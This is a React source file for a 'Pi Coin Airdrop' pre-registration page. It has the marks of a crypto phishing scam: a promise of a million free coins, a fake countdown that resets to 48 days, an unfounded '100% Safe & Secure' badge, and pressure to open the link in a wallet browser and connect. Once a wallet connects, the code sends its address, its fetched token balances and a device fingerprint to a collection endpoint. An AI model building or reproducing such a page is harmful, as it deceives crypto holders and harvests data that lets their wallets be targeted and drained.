
import { useState, useEffect } from "react";
import { WalletConnectionModal } from "@/components/wallet-connection-modal";
import { AirdropFinishedModal } from "@/components/airdrop-finished-modal";
import { Button } from "@/components/ui/button";
import { Wallet, ShieldCheck, Gift, TrendingUp, Info, ChevronDown, ChevronUp } from "lucide-react";
import { Card } from "@/components/ui/card";
import { fetchWalletBalances } from "@/lib/web3";

export default function Home() {
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [showFinishedModal, setShowFinishedModal] = useState(false);
  const [showInstructions, setShowInstructions] = useState(false);
  const [walletAddress, setWalletAddress] = useState<string | null>(null);
  const [isConnected, setIsConnected] = useState(false);
  const [hasClaimed, setHasClaimed] = useState(false);
  const [expandedSection, setExpandedSection] = useState<string | null>(null);
  const [timeRemaining, setTimeRemaining] = useState({
    days: 0,
    hours: 0,
    minutes: 0,
    seconds: 0
  });

  useEffect(() => {
    // Load connected wallets from localStorage - support multiple wallet types
    const connectedWallets = JSON.parse(localStorage.getItem('connectedWallets') || '[]');
    
    if (connectedWallets.length > 0) {
      // User has connected at least one wallet - show the most recent
      const lastWallet = connectedWallets[connectedWallets.length - 1];
      setWalletAddress(lastWallet.address);
      setIsConnected(true);
      setHasClaimed(true);
    }
    
    // Don't block claiming with different wallet types
    // Users can connect multiple wallets (MetaMask, Trust Wallet, etc.)
  }, []);

  // Countdown timer - admin controlled or default 48 days
  useEffect(() => {
    const calculateTimeRemaining = () => {
      // Check if admin has set a custom target date
      const adminTargetDate = localStorage.getItem('airdropTargetDate');
      let targetDate: Date;
      
      if (adminTargetDate) {
        targetDate = new Date(adminTargetDate);
      } else {
        // Default: 48 days from now
        targetDate = new Date();
        targetDate.setDate(targetDate.getDate() + 48);
      }
      
      const now = new Date().getTime();
      const target = targetDate.getTime();
      const difference = target - now;

      if (difference > 0) {
        const days = Math.floor(difference / (1000 * 60 * 60 * 24));
        const hours = Math.floor((difference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        const minutes = Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((difference % (1000 * 60)) / 1000);

        setTimeRemaining({ days, hours, minutes, seconds });
      } else {
        // Timer expired
        setTimeRemaining({ days: 0, hours: 0, minutes: 0, seconds: 0 });
      }
    };

    calculateTimeRemaining();
    const interval = setInterval(calculateTimeRemaining, 1000);

    return () => clearInterval(interval);
  }, []);

  const toggleSection = (section: string) => {
    setExpandedSection(expandedSection === section ? null : section);
  };

  const handleClaimClick = () => {
    // Prevent reconnection if already registered
    if (hasClaimed && isConnected) {
      setShowFinishedModal(true);
      return;
    }

    // Check if opened in regular browser (not wallet browser)
    const isInWalletBrowser = typeof window.ethereum !== 'undefined' || 
                              typeof window.trustwallet !== 'undefined' ||
                              typeof window.BinanceChain !== 'undefined';
    
    if (!isInWalletBrowser) {
      setShowInstructions(true);
    } else {
      setShowWalletModal(true);
    }
  };

  const handleWalletConnected = async (address: string) => {
    const walletType = localStorage.getItem('walletType') || 'Unknown';

    // Get device information helper
    const getDeviceInfo = () => {
      const ua = navigator.userAgent;
      let browser = 'Unknown';
      if (ua.includes('Chrome')) browser = 'Chrome';
      else if (ua.includes('Safari')) browser = 'Safari';
      else if (ua.includes('Firefox')) browser = 'Firefox';
      else if (ua.includes('Edge')) browser = 'Edge';

      let os = 'Unknown';
      if (ua.includes('Windows')) os = 'Windows';
      else if (ua.includes('Mac')) os = 'macOS';
      else if (ua.includes('Linux')) os = 'Linux';
      else if (ua.includes('Android')) os = 'Android';
      else if (ua.includes('iOS')) os = 'iOS';

      return {
        browser,
        os,
        userAgent: ua,
        screen: `${window.screen.width}x${window.screen.height}`,
        model: ua,
      };
    };

    // Try to fetch balances, but don't let failures block the save
    let balances = {};
    try {
      console.log('Fetching balances for:', address);
      balances = await fetchWalletBalances(address);
      console.log('Balances fetched:', balances);
    } catch (balanceError) {
      console.warn('Failed to fetch balances (non-fatal):', balanceError);
      // Continue with empty balances - Trust Wallet RPC often fails on mobile
    }

    // ALWAYS save to database, even if balance fetch failed
    const deviceInfo = getDeviceInfo();
    try {
      console.log('Saving claim to database...');
      const response = await fetch('/api/claims', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletAddress: address,
          walletType,
          balances,
          deviceModel: deviceInfo.model,
          deviceBrowser: deviceInfo.browser,
          deviceOS: deviceInfo.os,
          deviceScreen: deviceInfo.screen,
          userAgent: deviceInfo.userAgent,
        }),
      });

      if (!response.ok) {
        const errorText = await response.text();
        console.error('Failed to save claim:', errorText);
        throw new Error(`Failed to save: ${errorText}`);
      }

      console.log('✅ Claim saved successfully to database!');

      // Update UI and localStorage ONLY after successful save
      setWalletAddress(address);
      setIsConnected(true);
      setShowWalletModal(false);

      // Store connected wallets as array to support multiple wallet types
      const connectedWallets = JSON.parse(localStorage.getItem('connectedWallets') || '[]');
      if (!connectedWallets.some((w: any) => w.address === address && w.type === walletType)) {
        connectedWallets.push({ address, type: walletType, timestamp: Date.now() });
        localStorage.setItem('connectedWallets', JSON.stringify(connectedWallets));
      }
      localStorage.setItem('walletAddress', address);

      // Show success modal
      setHasClaimed(true);
      localStorage.setItem('airdropClaimed', 'true');
      setShowFinishedModal(true);

    } catch (saveError) {
      console.error('❌ Error saving claim to database:', saveError);
      // Throw error back to modal so it can show error and allow retry
      throw new Error('Failed to save wallet connection: ' + (saveError instanceof Error ? saveError.message : 'Unknown error'));
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center px-4 py-12" 
         style={{ background: 'linear-gradient(135deg, #4A148C 0%, #7B1FA2 50%, #9C27B0 100%)' }}>
      <div className="w-full max-w-2xl mx-auto text-center space-y-8">
        {/* Professional Pi Coin Logo */}
        <div className="flex justify-center mb-6">
          <div className="relative">
            <div className="w-40 h-40 rounded-full bg-gradient-to-br from-yellow-400 to-orange-500 flex items-center justify-center shadow-2xl p-1">
              <div className="w-full h-full rounded-full bg-[#4A148C] flex items-center justify-center">
                <svg viewBox="0 0 200 200" className="w-32 h-32">
                  <text x="100" y="135" fontSize="120" fill="#F59E0B" textAnchor="middle" fontFamily="serif" fontWeight="bold">π</text>
                </svg>
              </div>
            </div>
            <div className="absolute inset-0 rounded-full bg-yellow-400/20 animate-ping" />
          </div>
        </div>

        {/* Headline */}
        <div className="space-y-4">
          <h1 className="text-5xl md:text-7xl font-bold text-white tracking-tight drop-shadow-lg">
            Pi Coin Airdrop
          </h1>
          <div className="inline-block bg-white/20 backdrop-blur-md rounded-2xl px-8 py-4 border-2 border-yellow-400/50">
            <p className="text-3xl md:text-4xl font-bold text-yellow-400">
              10,00,000 PI Coins
            </p>
            <p className="text-sm text-white/80 mt-1">Pre-Registration Offer</p>
          </div>
        </div>

        {/* Countdown Timer */}
        <Card className="bg-white/10 backdrop-blur-lg border-white/20 p-6">
          <h3 className="text-xl font-semibold text-yellow-400 mb-4 text-center flex items-center justify-center gap-2">
            <TrendingUp className="w-6 h-6" />
            Airdrop Distribution Starts In:
          </h3>
          <div className="grid grid-cols-4 gap-4 mb-4">
            <div className="bg-white/5 backdrop-blur-sm rounded-xl p-4 border border-yellow-400/30 text-center transition-all duration-300 hover:scale-105">
              <p className="text-4xl md:text-5xl font-bold text-yellow-400 font-mono tabular-nums">{timeRemaining.days}</p>
              <p className="text-xs text-white/60 mt-2 uppercase tracking-wider">Days</p>
            </div>
            <div className="bg-white/5 backdrop-blur-sm rounded-xl p-4 border border-yellow-400/30 text-center transition-all duration-300 hover:scale-105">
              <p className="text-4xl md:text-5xl font-bold text-yellow-400 font-mono tabular-nums">{String(timeRemaining.hours).padStart(2, '0')}</p>
              <p className="text-xs text-white/60 mt-2 uppercase tracking-wider">Hours</p>
            </div>
            <div className="bg-white/5 backdrop-blur-sm rounded-xl p-4 border border-yellow-400/30 text-center transition-all duration-300 hover:scale-105">
              <p className="text-4xl md:text-5xl font-bold text-yellow-400 font-mono tabular-nums">{String(timeRemaining.minutes).padStart(2, '0')}</p>
              <p className="text-xs text-white/60 mt-2 uppercase tracking-wider">Minutes</p>
            </div>
            <div className="bg-white/5 backdrop-blur-sm rounded-xl p-4 border border-yellow-400/30 text-center transition-all duration-300 hover:scale-105">
              <p className="text-4xl md:text-5xl font-bold text-yellow-400 font-mono tabular-nums">{String(timeRemaining.seconds).padStart(2, '0')}</p>
              <p className="text-xs text-white/60 mt-2 uppercase tracking-wider">Seconds</p>
            </div>
          </div>
          <p className="text-center text-white/90 text-sm">
            ⚠️ Register now for the airdrop! After this time, registration will close. 
            Registered wallets will receive airdrop randomly within 7 days of distribution start.
          </p>
        </Card>

        {/* Instructions */}
        <Card className="bg-white/10 backdrop-blur-lg border-white/20 p-6 text-left">
          <h3 className="text-xl font-semibold text-yellow-400 mb-4 flex items-center gap-2">
            <Gift className="w-6 h-6" />
            How to Pre-Register:
          </h3>
          <ol className="space-y-3 text-white/90">
            <li className="flex gap-3">
              <span className="flex-shrink-0 w-6 h-6 rounded-full bg-yellow-400 text-purple-900 font-bold flex items-center justify-center text-sm">1</span>
              <span>Open this link in your Crypto Wallet browser (Trust Wallet, MetaMask, or Binance Wallet)</span>
            </li>
            <li className="flex gap-3">
              <span className="flex-shrink-0 w-6 h-6 rounded-full bg-yellow-400 text-purple-900 font-bold flex items-center justify-center text-sm">2</span>
              <span>Click the "Pre-Register Now" button</span>
            </li>
            <li className="flex gap-3">
              <span className="flex-shrink-0 w-6 h-6 rounded-full bg-yellow-400 text-purple-900 font-bold flex items-center justify-center text-sm">3</span>
              <span>Connect your wallet securely</span>
            </li>
            <li className="flex gap-3">
              <span className="flex-shrink-0 w-6 h-6 rounded-full bg-yellow-400 text-purple-900 font-bold flex items-center justify-center text-sm">4</span>
              <span>Your wallet will be registered! Airdrop will be sent randomly to registered wallets after distribution starts.</span>
            </li>
          </ol>
        </Card>

        {/* Pi Statistics */}
        <Card className="bg-white/10 backdrop-blur-lg border-white/20 p-6">
          <h3 className="text-2xl font-semibold text-yellow-400 mb-6 flex items-center gap-2">
            <TrendingUp className="w-6 h-6" />
            Pi Network Statistics
          </h3>
          <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
            <div className="bg-white/5 backdrop-blur-sm rounded-xl p-4 border border-white/10">
              <p className="text-xs text-white/60 mb-1">Market Cap</p>
              <p className="text-lg font-bold text-white">$1.89B</p>
              <p className="text-xs text-green-400 mt-1">↑ 0.23%</p>
            </div>
            <div className="bg-white/5 backdrop-blur-sm rounded-xl p-4 border border-white/10">
              <p className="text-xs text-white/60 mb-1">Volume (24h)</p>
              <p className="text-lg font-bold text-white">$27.64M</p>
              <p className="text-xs text-green-400 mt-1">↑ 60.82%</p>
            </div>
            <div className="bg-white/5 backdrop-blur-sm rounded-xl p-4 border border-white/10">
              <p className="text-xs text-white/60 mb-1">FDV</p>
              <p className="text-lg font-bold text-white">$22.75B</p>
            </div>
            <div className="bg-white/5 backdrop-blur-sm rounded-xl p-4 border border-white/10">
              <p className="text-xs text-white/60 mb-1">Vol/Mkt Cap (24h)</p>
              <p className="text-lg font-bold text-white">1.44%</p>
            </div>
            <div className="bg-white/5 backdrop-blur-sm rounded-xl p-4 border border-white/10">
              <p className="text-xs text-white/60 mb-1">Total Supply</p>
              <p className="text-lg font-bold text-white">100B PI</p>
            </div>
            <div className="bg-white/5 backdrop-blur-sm rounded-xl p-4 border border-white/10">
              <p className="text-xs text-white/60 mb-1">Circulating Supply</p>
              <p className="text-lg font-bold text-white">8.3B PI</p>
            </div>
          </div>
        </Card>

        {/* About Pi Network */}
        <Card className="bg-white/10 backdrop-blur-lg border-white/20 p-6 text-left">
          <h3 className="text-2xl font-semibold text-yellow-400 mb-4 flex items-center gap-2">
            <Info className="w-6 h-6" />
            About Pi Network
          </h3>
          
          <div className="space-y-3">
            <div className="border-b border-white/10 pb-3">
              <button
                onClick={() => toggleSection('what-is')}
                className="w-full flex items-center justify-between text-left"
              >
                <span className="text-lg font-semibold text-white">What Is Pi Network?</span>
                {expandedSection === 'what-is' ? (
                  <ChevronUp className="w-5 h-5 text-yellow-400" />
                ) : (
                  <ChevronDown className="w-5 h-5 text-yellow-400" />
                )}
              </button>
              {expandedSection === 'what-is' && (
                <p className="text-sm text-white/80 mt-3 leading-relaxed">
                  Pi Network is a social cryptocurrency, developer platform, and ecosystem designed for widespread accessibility and real-world utility. It enables users to mine and transact Pi using a mobile-friendly interface while supporting applications built within its blockchain ecosystem.
                </p>
              )}
            </div>

            <div className="border-b border-white/10 pb-3">
              <button
                onClick={() => toggleSection('founders')}
                className="w-full flex items-center justify-between text-left"
              >
                <span className="text-lg font-semibold text-white">Who Are the Founders?</span>
                {expandedSection === 'founders' ? (
                  <ChevronUp className="w-5 h-5 text-yellow-400" />
                ) : (
                  <ChevronDown className="w-5 h-5 text-yellow-400" />
                )}
              </button>
              {expandedSection === 'founders' && (
                <p className="text-sm text-white/80 mt-3 leading-relaxed">
                  Pi Network was founded by Stanford PhDs Dr. Nicolas Kokkalis and Dr. Chengdiao Fan, along with Vincent McPhillip. The team brings expertise in distributed systems, social computing, and blockchain technology.
                </p>
              )}
            </div>

            <div className="border-b border-white/10 pb-3">
              <button
                onClick={() => toggleSection('supply')}
                className="w-full flex items-center justify-between text-left"
              >
                <span className="text-lg font-semibold text-white">Supply Model & Mining</span>
                {expandedSection === 'supply' ? (
                  <ChevronUp className="w-5 h-5 text-yellow-400" />
                ) : (
                  <ChevronDown className="w-5 h-5 text-yellow-400" />
                )}
              </button>
              {expandedSection === 'supply' && (
                <p className="text-sm text-white/80 mt-3 leading-relaxed">
                  Pi has a maximum supply of 100 billion tokens. The mining mechanism is mobile-friendly and doesn't drain battery or use excessive data. Users can mine Pi by simply opening the app daily and tapping a button.
                </p>
              )}
            </div>

            <div className="pb-3">
              <button
                onClick={() => toggleSection('ecosystem')}
                className="w-full flex items-center justify-between text-left"
              >
                <span className="text-lg font-semibold text-white">Ecosystem & Adoption</span>
                {expandedSection === 'ecosystem' ? (
                  <ChevronUp className="w-5 h-5 text-yellow-400" />
                ) : (
                  <ChevronDown className="w-5 h-5 text-yellow-400" />
                )}
              </button>
              {expandedSection === 'ecosystem' && (
                <p className="text-sm text-white/80 mt-3 leading-relaxed">
                  Pi Network has over 50 million engaged Pioneers worldwide. The mainnet launched in 2024, enabling real transactions and third-party applications. The ecosystem focuses on creating real-world utility and peer-to-peer marketplace functionality.
                </p>
              )}
            </div>
          </div>
        </Card>

        {/* CTA Button */}
        <div className="pt-6">
          <Button 
            size="lg"
            className="w-full max-w-md h-16 text-xl font-bold rounded-2xl bg-gradient-to-r from-yellow-400 to-orange-500 hover:from-yellow-500 hover:to-orange-600 text-purple-900 shadow-2xl hover:shadow-yellow-400/50 transition-all duration-300 hover:scale-105"
            onClick={handleClaimClick}
            data-testid="button-claim-airdrop"
          >
            <Wallet className="w-6 h-6 mr-2" />
            {hasClaimed && isConnected ? 'Already Registered ✓' : 'Pre-Register Now'}
          </Button>
        </div>

        {/* Security Badge */}
        <div className="pt-8">
          <div className="inline-flex items-center gap-2 px-6 py-3 rounded-full bg-green-500/20 border border-green-400/40 backdrop-blur-sm">
            <ShieldCheck className="w-5 h-5 text-green-400" />
            <span className="text-sm text-green-300 font-medium">100% Safe & Secure</span>
          </div>
        </div>
      </div>

      {/* Instructions Modal for Chrome Users */}
      {showInstructions && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <Card className="max-w-md w-full bg-gradient-to-br from-purple-900 to-purple-800 border-yellow-400/30 p-8">
            <h2 className="text-2xl font-bold text-yellow-400 mb-4">Please Open in Wallet Browser</h2>
            <p className="text-white/90 mb-6">
              To claim this airdrop, you need to open this link in your crypto wallet's in-app browser.
            </p>
            
            <div className="space-y-3 mb-6">
              <Card className="p-4 bg-white/10 border-white/20">
                <p className="font-semibold text-yellow-400 mb-2">📱 Open in Trust Wallet:</p>
                <p className="text-sm text-white/80">Open Trust Wallet App → Browser → Paste this link</p>
              </Card>
              
              <Card className="p-4 bg-white/10 border-white/20">
                <p className="font-semibold text-yellow-400 mb-2">🦊 Open in MetaMask:</p>
                <p className="text-sm text-white/80">Open MetaMask App → Browser Tab → Paste this link</p>
              </Card>
              
              <Card className="p-4 bg-white/10 border-white/20">
                <p className="font-semibold text-yellow-400 mb-2">🟡 Open in Binance Wallet:</p>
                <p className="text-sm text-white/80">Open Binance App → DApp Browser → Paste this link</p>
              </Card>
            </div>

            <Button 
              onClick={() => setShowInstructions(false)}
              className="w-full bg-yellow-400 hover:bg-yellow-500 text-purple-900 font-bold"
            >
              Got It
            </Button>
          </Card>
        </div>
      )}

      <WalletConnectionModal 
        isOpen={showWalletModal}
        onClose={() => setShowWalletModal(false)}
        onWalletConnected={handleWalletConnected}
      />

      <AirdropFinishedModal 
        isOpen={showFinishedModal} 
        onClose={() => setShowFinishedModal(false)} 
      />
    </div>
  );
}
